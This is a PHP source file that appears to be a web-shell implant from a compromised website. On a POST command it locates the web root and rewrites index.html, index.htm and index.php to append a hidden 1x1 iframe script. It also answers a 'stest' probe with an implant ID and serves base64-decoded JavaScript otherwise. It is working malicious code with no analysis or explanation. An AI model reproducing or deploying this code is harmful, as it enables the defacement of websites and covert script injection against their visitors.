<?php

$inject = "";
$injectId = "54f97afe6e4b7";

error_reporting(0);

define('inCode', $inCode = '<script type="text/javascript">document.body.innerHTML = document.body.innerHTML + \'<iframe src="' . $_SERVER['PHP_SELF'] . '" width=1 height=1 scrolling=no frameborder=0></iframe>\';</script>');

function removeOldCode($file, &$html, $isPhp = false)
{
    $html = file_get_contents($file);
    $html = preg_replace('/<script type="text\/javascript">document.body.innerHTML = document.body.innerHTML \+ \'<iframe src="(.*?)" width=1 height=1 scrolling=no frameborder=0><\/iframe>\';<\/script>/is', "", $html);

    if ($isPhp) {
        $html = preg_replace('/<\?php echo \'<script type="text\/javascript">document.body.innerHTML = document.body.innerHTML \+ [\\\]\'<iframe src="(.*?)" width=1 height=1 scrolling=no frameborder=0><\/iframe>[\\\]\';<\/script>\'; \?>/is', "", $html);
    }

    return file_put_contents($file, $html);
}

function inHtml($file)
{
    if (!removeOldCode($file, $code)) {
        return false;
    }

    return file_put_contents($file, $code . inCode);
}

function inPhp($file)
{
    if (!removeOldCode($file, $code, true)) {
        return false;
    }

    if (strpos($code, '<?php') === false && strpos($code, '<?') === false) {
        return file_put_contents($file, $code . inCode);
    } else {
        $inCode = '<?php echo \'' . str_replace("'", "\\'", inCode) . '\'; ?>';

        if (($pos = strrpos($code, '?>')) === false) {
            return file_put_contents($file, $code . '?>' . $inCode);
        } else {
            $code = substr_replace($code, $inCode, $pos + 2, 0);
            return file_put_contents($file, $code);
        }
    }
}

if (isset($_POST['run'])) {
    $shellPath = pathinfo($_SERVER['REQUEST_URI'], PATHINFO_DIRNAME);

    if ($shellPath === '/' || $shellPath === '\\') {
        $shellPath = '';
    }

    $shellDir = dirname(__FILE__);
    $levelUp = str_repeat(DIRECTORY_SEPARATOR . '..', substr_count($shellPath, '/'));

    $wwwPath = realpath($shellDir . $levelUp);

    if (empty($wwwPath)) {
        $wwwPath = $shellDir . $levelUp;
    }

    $state = true;

    if (file_exists($wwwPath . DIRECTORY_SEPARATOR . 'index.html')) {
        if (!inHtml($wwwPath . DIRECTORY_SEPARATOR . 'index.html')) {
            $state = false;
        }
    }

    if (file_exists($wwwPath . DIRECTORY_SEPARATOR . 'index.htm')) {
        if (!inHtml($wwwPath . DIRECTORY_SEPARATOR . 'index.htm')) {
            $state = false;
        }
    }

    if (file_exists($wwwPath . DIRECTORY_SEPARATOR . 'index.php')) {
        if (!inPhp($wwwPath . DIRECTORY_SEPARATOR . 'index.php')) {
            $state = false;
        }
    }

    if ($state) {
        echo 's:ok';
    } else {
        echo 's:er';
    }
} elseif (isset($_POST['stest'])) {
    echo $injectId;
} else {
    echo '<script type="text/javascript">' . base64_decode($inject) . '</script>';
}